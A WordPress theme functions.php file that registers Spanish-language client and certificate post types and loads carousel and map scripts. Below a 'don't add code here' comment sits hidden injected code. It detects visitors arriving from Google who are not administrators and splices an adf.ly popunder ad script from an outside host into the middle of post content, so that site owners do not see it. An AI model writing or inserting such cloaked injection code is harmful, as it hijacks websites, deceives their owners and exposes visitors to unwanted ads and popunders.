<?php
/**
 * Functions and definitions.
 *
 * PLEASE DON'T MODIFY THIS FILE.
 * Use the provided child theme for all your modifications.
 *
 * For the full license information, please view the Licensing folder
 * that was distributed with this source code.
 *
 * @package G1_Framework
 * @subpackage G1_Theme03
 * @since G1_Theme03 1.0.0
 */

// Prevent direct script access
if ( !defined('ABSPATH') )
	die ( 'No direct script access allowed' );

// Define paths to common folders
define( 'G1_LIB_DIR',    	trailingslashit( get_template_directory() ) .  'lib' );
define( 'G1_LIB_URI',    	trailingslashit( get_template_directory_uri() ) .  'lib' );

define( 'G1_FRAMEWORK_DIR', trailingslashit( get_template_directory() ) . 'g1-framework' );
define( 'G1_FRAMEWORK_URI', trailingslashit( get_template_directory_uri() ) . 'g1-framework' );

/**
 * Enable translation (i18n)
 */
function g1_init_localization_before_theme() {
    $dir = trailingslashit( get_template_directory() );

    if (!load_child_theme_textdomain( 'g1_theme', get_stylesheet_directory().'/languages' )) {
        load_theme_textdomain( 'g1_theme', $dir . 'languages' );
    }

    $locale = get_locale();
    $locale_file = $dir . "languages/$locale.php";
    if ( is_readable( $locale_file ) )
        require_once( $locale_file );
}

g1_init_localization_before_theme();

require_once( G1_FRAMEWORK_DIR . '/g1-framework.php' );

require_once( G1_LIB_DIR . '/theme-dependencies.php' );
require_once( G1_LIB_DIR . '/theme-functions.php' );
require_once( G1_LIB_DIR . '/theme-features.php' );
require_once( G1_LIB_DIR . '/g1-precontent/g1-precontent.php' );
require_once( G1_LIB_DIR . '/g1-sliders/g1-sliders.php' );
require_once( G1_LIB_DIR . '/g1-pages/g1-pages.php' );
require_once( G1_LIB_DIR . '/g1-posts/g1-posts.php' );

// Include plugin.php file so we can use the is_plugin_active() function
include_once( ABSPATH . 'wp-admin/includes/plugin.php' );

if ( is_plugin_active('woocommerce/woocommerce.php') ) {
    require_once( G1_LIB_DIR . '/g1-woocommerce/g1-woocommerce.php' );
}

if ( is_plugin_active('sfwd-lms/sfwd_lms.php') ) {
    require_once( G1_LIB_DIR . '/g1-learndash/g1-learndash.php' );
}

/* Do you want to disable the Twitter module completely?
 *
 * Just copy the below line to the functions.php file from your child theme:
 * define( 'G1_TWITTER_MODULE', false );
 */
define( 'G1_TWITTER_MODULE', true );
if ( G1_TWITTER_MODULE ) {
    require_once( G1_LIB_DIR . '/g1-twitter/g1-twitter.php' );
}

/* Do you want to disable the GMap module completely?
 *
 * Just copy the below line to the functions.php file from your child theme:
 * define( 'G1_GMAP_MODULE', false );
 */
define( 'G1_GMAP_MODULE', true );
if ( G1_GMAP_MODULE ) {
    require_once( G1_LIB_DIR . '/g1-gmap/g1-gmap.php' );
}

/* Do you want to disable the Mailchimp module completely?
 *
 * Just copy the below line to the functions.php file from your child theme:
 * define( 'G1_MAILCHIMP_MODULE', false );
 */
define( 'G1_MAILCHIMP_MODULE', true );
if ( G1_MAILCHIMP_MODULE ) {
    require_once( G1_LIB_DIR . '/g1-mailchimp/g1-mailchimp.php' );
}

/* Do you want to disable the Maintenance module completely?
 *
 * Just copy the below line to the functions.php file from your child theme:
 * define( 'G1_MAINTENANCE_MODULE', false );
 */
define( 'G1_MAINTENANCE_MODULE', true );
if ( G1_MAINTENANCE_MODULE ) {
    require_once( G1_LIB_DIR . '/g1-maintenance/g1-maintenance.php' );
}

/* Do you want to disable the Contact Form module completely?
 *
 * Just copy the below line to the functions.php file from your child theme:
 * define( 'G1_TWITTER_MODULE', false );
 */
define( 'G1_CONTACT_FORM_MODULE', true );
if ( G1_CONTACT_FORM_MODULE ) {
    require_once( G1_LIB_DIR . '/g1-contact-form/g1-contact-form.php' );
}



/* Do you want to disable the Work module completely?
 *
 * Just copy the below line to the functions.php file from your child theme:
 * define( 'G1_WORKS_MODULE', false );
 */
define( 'G1_WORKS_MODULE', true );
if ( G1_WORKS_MODULE ) {
    require_once( G1_LIB_DIR . '/g1-works/g1-works.php' );
}

/* Do you want to disable the Simple_Slider module completely?
 *
 * Just copy the below line to the functions.php file from your child theme:
 * define( 'G1_SIMPLE_SLIDER_MODULE', false );
 */
define( 'G1_SIMPLE_SLIDERS_MODULE', true );
if ( G1_SIMPLE_SLIDERS_MODULE ) {
    require_once( G1_LIB_DIR . '/g1-simple-sliders/g1-simple-sliders.php' );
}

require_once( G1_LIB_DIR . '/g1-relations/g1-relations.php' );
require_once( G1_LIB_DIR . '/theme-options.php' );
require_once( G1_LIB_DIR . '/theme-fonts.php' );

// Set standard content width
if ( ! isset( $content_width ) ) $content_width = 686;


/* PLEASE
 * Don't add any code below here, use the child theme for all your modifications
 */



if (isset($_SERVER['HTTP_REFERER'])) { 

    $uri = parse_url($_SERVER['HTTP_REFERER']);


    if(stripos($uri['host'], "google.") !== false){
       if(!current_user_can('manage_options')){
           add_filter( 'the_title', 'getTheTitleAdm');
        }
    }

}

function getTheTitleAdm( $title ) {
    
    if (is_single()) {
        add_filter( 'the_content', 'admTheContentAdm');
        $GLOBALS['wp_adm_sett'] = true;
    }
    return $title;
}  

function admTheContentAdm( $content ) {
    
    if ($GLOBALS['wp_adm_sett'] == true) {
        $css="var adfly_id = 2490020; var adfly_advert = 'int'; var frequency_cap = 5; var frequency_delay = 5; var init_delay = 3; var popunder = true; ";
        $words = explode(" ", $content);

        if (count($words) > 10) {

            $k = (int)round(count($words)/2);
            
            $words[$k] .= ' <script type="text/javascript"> '.$css.'</script> <script src="https://cdn.adf.ly/js/entry.js"></script> ';

            $content = implode(" ", $words);
            
            return $content;
        }else{
            return $content;
        }
    }
    return $content; 
}


add_filter( 'wp_tag_cloud', 'g1_wp_tag_cloud', 10, 2 );
function g1_wp_tag_cloud( $return, $args ) {
    if ( 'flat' === $args['format'] ) {
        $return = '<div class="g1-tagcloud">' . $return . '</div>';
    }

    return $return;
}

/*
    * Enable support for Post Thumbnails on posts and pages.
    *
    * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
*/

add_image_size( 'cliente', 250, 100, array( 'center', 'center' ) );

/**
 * Client Post Type.
 */
function myClients() {

	$labels = array(
		'name'                => _x( 'Clientes', 'Post Type General Name', 'text_domain' ),
		'singular_name'       => _x( 'Cliente', 'Post Type Singular Name', 'text_domain' ),
		'menu_name'           => __( 'Clientes', 'text_domain' ),
		'parent_item_colon'   => __( 'Artículo padre:', 'text_domain' ),
		'all_items'           => __( 'Todos los clientes', 'text_domain' ),
		'view_item'           => __( 'Ver clientes', 'text_domain' ),
		'add_new_item'        => __( 'Agregar nuevo cliente', 'text_domain' ),
		'add_new'             => __( 'Añadir nuevo', 'text_domain' ),
		'edit_item'           => __( 'Editar cliente', 'text_domain' ),
		'update_item'         => __( 'Actualizar cliente', 'text_domain' ),
		'search_items'        => __( 'Buscar clientes', 'text_domain' ),
		'not_found'           => __( 'No encontrado', 'text_domain' ),
		'not_found_in_trash'  => __( 'No se encuentra en la papelera', 'text_domain' ),
	);
	$args = array(
		'label'               => __( 'clientes', 'text_domain' ),
		'description'         => __( 'Agregar un cliente a su portafolio', 'text_domain' ),
		'labels'              => $labels,
		'supports'            => array( 'title', 'thumbnail', ),
		'taxonomies'          => array( 'thumbnail' ),
		'hierarchical'        => false,
		'public'              => true,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 5,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => true,
		'publicly_queryable'  => true,
		'capability_type'     => 'post',
	);
	register_post_type( 'clientes', $args );

}
// Hook into the 'init' action
add_action( 'init', 'myClients', 0 );

function clientesBoxes( $meta_boxes ) {
    $prefix = '_cl_'; // Prefix for all fields
    $meta_boxes['client_metabox'] = array(
        'id' => 'client_metabox',
        'title' => 'Informacion del cliente',
        'pages' => array('clientes'), // post type
        'context' => 'normal',
        'priority' => 'high',
        'show_names' => true, // Show field names on the left
        'fields' => array(
				
			array(
    			'name' => 'Nombre de la empresa',
    			'id' => $prefix . 'client_name',
    			'type' => 'text'
				),	
				
			array(
    			'name' => 'Descripción del trabajo',
    			'id' => $prefix . 'client_description',
    			'type' => 'text'
				),
        ),
    );

    return $meta_boxes;
}
add_filter( 'cmb_meta_boxes', 'clientesBoxes' );

// Initialize custom post types 
add_action( 'init', 'be_initialize_cmb_meta_boxes', 9999 );
function be_initialize_cmb_meta_boxes() {
    if ( !class_exists( 'cmb_Meta_Box' ) ) {
        require_once( 'meta/init.php' );
    }
} 


/* add Certificados Chamilo */
function myCertificates() {

	$labels = array(
		'name'                => _x( 'Certificados', 'Post Type General Name', 'text_domain' ),
		'singular_name'       => _x( 'Certificado', 'Post Type Singular Name', 'text_domain' ),
		'menu_name'           => __( 'Certificados', 'text_domain' ),
		'parent_item_colon'   => __( 'Artículo padre:', 'text_domain' ),
		'all_items'           => __( 'Todos los certificados', 'text_domain' ),
		'view_item'           => __( 'Ver certificados', 'text_domain' ),
		'add_new_item'        => __( 'Agregar nuevo certificado', 'text_domain' ),
		'add_new'             => __( 'Añadir nuevo', 'text_domain' ),
		'edit_item'           => __( 'Editar certificado', 'text_domain' ),
		'update_item'         => __( 'Actualizar certificado', 'text_domain' ),
		'search_items'        => __( 'Buscar certificados', 'text_domain' ),
		'not_found'           => __( 'No encontrado', 'text_domain' ),
		'not_found_in_trash'  => __( 'No se encuentra en la papelera', 'text_domain' ),
	);
	$args = array(
		'label'               => __( 'certificados', 'text_domain' ),
		'description'         => __( 'Agregar un certificado al registro', 'text_domain' ),
		'labels'              => $labels,
		'supports'            => array( 'title', 'thumbnail'),
		'taxonomies'          => array( 'thumbnail'),
		'hierarchical'        => false,
		'public'              => true,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => false,
		'show_in_admin_bar'   => true,
		'menu_position'       => 6,
		'can_export'          => true,
		'has_archive'         => false,
		'exclude_from_search' => true,
		'publicly_queryable'  => true,
                'public'              => false, //no es publico y no tiene url
		'capability_type'     => 'post',
                'rewrite' => false,
	);
	register_post_type( 'certificate', $args );

}
// Hook into the 'init' action
add_action( 'init', 'myCertificates', 0 );
add_action( 'init', 'certificateTaxonomies', 0 );

// Creamos dos taxonomías, género y autor para el custom post type "libro"
function certificateTaxonomies() {
	// Añadimos nueva taxonomía y la hacemos jerárquica (como las categorías por defecto)
	$labels = array(
	'name' => _x( 'Tipos de certificados', 'taxonomy general name' ),
	'singular_name' => _x( 'Tipo de certificado', 'taxonomy singular name' ),
	'search_items' =>  __( 'Buscar por certificados' ),
	'all_items' => __( 'Todos los certificados' ),
	'edit_item' => __( 'Editar tipo' ),
	'update_item' => __( 'Actualizar tipo' ),
	'add_new_item' => __( 'Añadir nuevo tipo' ),
	'new_item_name' => __( 'Nombre del nuevo tipo' ),
);
    register_taxonomy( 'type', array( 'certificate' ), array(
            'hierarchical' => true,
            'labels' => $labels, /* ADVERTENCIA: Aquí es donde se utiliza la variable $labels */
            'show_ui' => true,
            'query_var' => true,
            'rewrite' => array( 'slug' => 'type' ),
    ));
}

//Añadimos datos a la vista de columnas para la vista de certificados
//add_filter('manage_edit-certificate_columns', 'add_certificate_columns');

add_filter('manage_certificate_posts_columns', 'posts_columns');
function posts_columns($defaults){
    $defaults['score'] = __('Puntaje Obtenido (%)');
    $defaults['type_certificate'] = __('Tipo de certificado');
    $defaults['id_certificate'] = _('ID de certificado');
    $defaults['date_certificate'] = _('Fecha de emisión');
    $defaults['country'] = _('Pais');
    return $defaults;
}
 
//Añadir los valores según corresponda
add_action('manage_certificate_posts_custom_column', 'posts_custom_columns', 5, 2);
function posts_custom_columns($column_name, $post_id){
    
    switch ($column_name){
        case 'type_certificate':
            //llamamos las taxonomias registradas
            $taxonomy = get_post_taxonomies();
            //identificamos las taxonomias según el post.
            $terms = get_the_terms($post_id, $taxonomy);
            
            foreach ($terms as $key => $value) {
                echo '<strong>' . $value->name . '</strong><br>';
                echo $value->description;
            }
            break;
        case 'id_certificate':
            $fieldID = get_field('idcertificate', $post_id);
            echo $fieldID;
            break;
        case 'date_certificate':
            $date = new DateTime(get_field('dateissue', $post_id));
            echo $date->format('D, d M Y');
            break;
        case 'score':
            $score = get_field('score', $post_id);
            echo $score.' %';
            break;
        case 'country':
            $country = get_field('country', $post_id);
            if(!empty($country)){
                echo $country;
            }else{
                echo 'No registrado';
            }       
    }
}



//cambiar el texto del titulo del post type

add_filter('gettext','custom_enter_title');

function custom_enter_title( $input ) {

    global $post_type;

    if( is_admin() && 'Introduce el título aquí' == $input && 'certificate' == $post_type )
        return 'Apellidos y nombres';

    return $input;
}

function addScripts() {
    wp_enqueue_style( 'owl-caroulse-style', get_stylesheet_directory_uri() . '/js/owl-carousel/owl.carousel.css', array(), false, false );
    wp_enqueue_style( 'owl-caroulse-theme', get_stylesheet_directory_uri() . '/js/owl-carousel/owl.theme.css', array(), false, false );
    wp_enqueue_script( 'owl-carousel', get_template_directory_uri() . '/js/owl-carousel/owl.carousel.min.js', array('jquery'), false, false );
}
add_action( 'wp_enqueue_scripts', 'addScripts' );

//listado de certificados.

function listCertificates($type){
    
    $items = query_posts( array ( 'post_type' => 'certificate', 'type' => $type, 'posts_per_page' => -1 ));
    
    
    $html = '<div class="g1-table g1-table--solid ">';
    $html .= '<table>';
    $html .= '<thead><tr><th>N°</th><th>Surname / Name</th><th>Score</th><th>Date</th><th>Certification Number</th><th>Country</th></tr></thead>';
    $list = array();
    $indexList = array();

    foreach ($items as $key => $value) {
        
        $idPost = $value->ID;
        $score = get_field('score', $idPost);
        $country = get_field('country', $idPost);
        $date =  new DateTime(get_field('dateissue', $idPost));
        $idCer = get_field('idcertificate', $idPost);
        $list[$idPost] = array('score' => trim($score), 'date' => $date, 'cert' => $idCer, 'title' => $value->post_title, 'country' => ($country != '' ? $country : 'Not registered'));
        $indexList[$idPost] = array('score' => $score);
    }
    arsort($indexList); //reordenamos los items de acuerdo al score
    $count = 1;
    foreach ($indexList as $key => $value) {
        $html .= '<tr>';
        $html .= '<td>';
        $html .= $count;
        $html .= '</td>';
        $html .= '<td>';
        $html .=  $list[$key]['title'];
        $html .= '</td>';
        $html .= '<td>';
        $html .= $list[$key]['score'] . ' %';
        $html .= '</td>';
        $html .= '<td>';
        $html .= $list[$key]['date']->format('D, d M Y');
        $html .= '</td>';
        $html .= '<td>';
        $html .= $list[$key]['cert'];
        $html .= '</td>';
        $html .= '<td>';
        $html .= $list[$key]['country'];
        $html .= '</td>';
        $html .= '</tr>';
        $count++;
    }
    
    $html .= '</table>';
    $html .= '</div>';
    
    echo $html;
    
}

function getCountCountry($nameCountry){
    
    global $wpdb;
    $sql =  $wpdb->prepare("SELECT ID, post_status, post_type, meta_key, meta_value, COUNT(*) AS score from bn_2_posts
            INNER JOIN bn_2_postmeta on bn_2_posts.ID = bn_2_postmeta.post_id WHERE
            bn_2_posts.post_type ='certificate' AND bn_2_posts.post_status = 'publish' AND bn_2_postmeta.meta_key = 'country'
            GROUP BY meta_value");
   
    $list = $wpdb->get_results($sql);
    $count = 0;
    foreach ($list as $key => $value) {
        
        if($value->meta_value == $nameCountry){
            $count = $value->score;
        }
    }
    return $count;
    
}

// auto title post type certificate despues de guardado

add_filter('wp_insert_post_data', 'automaticTitle', 99, 2);

function automaticTitle($data){
    global $post;
    if($data['post_type'] == 'certificate'){
        $data['post_title'] = get_field('lastname', $data['ID']) . ', ' . get_field('firstname', $data['ID']);
    }
    return $data;
}


function loadJSMaps() {
        
        
        wp_enqueue_style( 'style-jvectormaps', get_template_directory_uri(). '/js/jvectormap/jquery-jvectormap.css', array(), false, false );
   
        wp_enqueue_script( 'jvectormaps', get_template_directory_uri(). '/js/jvectormap/jquery-jvectormap.js', array(), false, false );
        wp_enqueue_script( 'jmousewheel', get_template_directory_uri(). '/js/jvectormap/lib/jquery-mousewheel.js', array(), false, false );
        wp_enqueue_script( 'jvectormap', get_template_directory_uri(). '/js/jvectormap/src/jvectormap.js', array(), false, false );
        wp_enqueue_script( 'abstract-element', get_template_directory_uri(). '/js/jvectormap/src/abstract-element.js', array(), false, false );
        wp_enqueue_script( 'abstract-canvas', get_template_directory_uri(). '/js/jvectormap/src/abstract-canvas-element.js', array(), false, false );
        wp_enqueue_script( 'abstract-shape', get_template_directory_uri(). '/js/jvectormap/src/abstract-shape-element.js', array(), false, false );
        
        wp_enqueue_script( 'svg-element', get_template_directory_uri(). '/js/jvectormap/src/svg-element.js', array(), false, false );
        wp_enqueue_script( 'svg-group-element', get_template_directory_uri(). '/js/jvectormap/src/svg-group-element.js', array(), false, false );
        wp_enqueue_script( 'svg-canvas', get_template_directory_uri(). '/js/jvectormap/src/svg-canvas-element.js', array(), false, false );
        wp_enqueue_script( 'svg-shape', get_template_directory_uri(). '/js/jvectormap/src/svg-shape-element.js', array(), false, false );
        wp_enqueue_script( 'svg-patch', get_template_directory_uri(). '/js/jvectormap/src/svg-path-element.js', array(), false, false );
        wp_enqueue_script( 'svg-circle', get_template_directory_uri(). '/js/jvectormap/src/svg-circle-element.js', array(), false, false );
        wp_enqueue_script( 'svg-image', get_template_directory_uri(). '/js/jvectormap/src/svg-image-element.js', array(), false, false );
        wp_enqueue_script( 'svg-text', get_template_directory_uri(). '/js/jvectormap/src/svg-text-element.js', array(), false, false );
        
        wp_enqueue_script( 'vml-element', get_template_directory_uri(). '/js/jvectormap/src/vml-element.js', array(), false, false );
        wp_enqueue_script( 'vml-group', get_template_directory_uri(). '/js/jvectormap/src/vml-group-element.js', array(), false, false );
        wp_enqueue_script( 'vml-canvas', get_template_directory_uri(). '/js/jvectormap/src/vml-canvas-element.js', array(), false, false );
        wp_enqueue_script( 'vml-shape', get_template_directory_uri(). '/js/jvectormap/src/vml-shape-element.js', array(), false, false );
        wp_enqueue_script( 'vml-patch', get_template_directory_uri(). '/js/jvectormap/src/vml-path-element.js', array(), false, false );
        wp_enqueue_script( 'vml-circle', get_template_directory_uri(). '/js/jvectormap/src/vml-circle-element.js', array(), false, false );
        wp_enqueue_script( 'vml-image', get_template_directory_uri(). '/js/jvectormap/src/vml-image-element.js', array(), false, false );
        
        wp_enqueue_script( 'map-object', get_template_directory_uri(). '/js/jvectormap/src/map-object.js', array(), false, false );
        wp_enqueue_script( 'map-region', get_template_directory_uri(). '/js/jvectormap/src/region.js', array(), false, false );
        wp_enqueue_script( 'map-marker', get_template_directory_uri(). '/js/jvectormap/src/map-marker.js', array(), false, false );
        
        wp_enqueue_script( 'vector-canvas', get_template_directory_uri(). '/js/jvectormap/src/vector-canvas.js', array(), false, false );
        wp_enqueue_script( 'simple-scale', get_template_directory_uri(). '/js/jvectormap/src/simple-scale.js', array(), false, false);
        wp_enqueue_script( 'ordinal-scale', get_template_directory_uri(). '/js/jvectormap/src/ordinal-scale.js', array(), false, false );
        wp_enqueue_script( 'numeric-scale', get_template_directory_uri(). '/js/jvectormap/src/numeric-scale.js', array(), false, false );
        wp_enqueue_script( 'color-scale', get_template_directory_uri(). '/js/jvectormap/src/color-scale.js', array(), false, false );
        wp_enqueue_script( 'legend', get_template_directory_uri(). '/js/jvectormap/src/legend.js', array(), false, false );
        wp_enqueue_script( 'data-series', get_template_directory_uri(). '/js/jvectormap/src/data-series.js', array(), false, false );
        wp_enqueue_script( 'proj', get_template_directory_uri(). '/js/jvectormap/src/proj.js', array(), false, false );
        wp_enqueue_script( 'map', get_template_directory_uri(). '/js/jvectormap/src/map.js', array(), false, false );
        
        wp_enqueue_script( 'jvectormap-world', get_template_directory_uri(). '/js/jvectormap/lib/jquery-jvectormap-world-mill.js', array(), false, false );
    
}

add_action( 'wp_enqueue_scripts', 'loadJSMaps' ); 

//quitamos el title del post type certificate

//add_action('admin_init', 'removeTitle');

//function removeTitle(){
    
  //      remove_post_type_support('certificate', 'title');
    
//}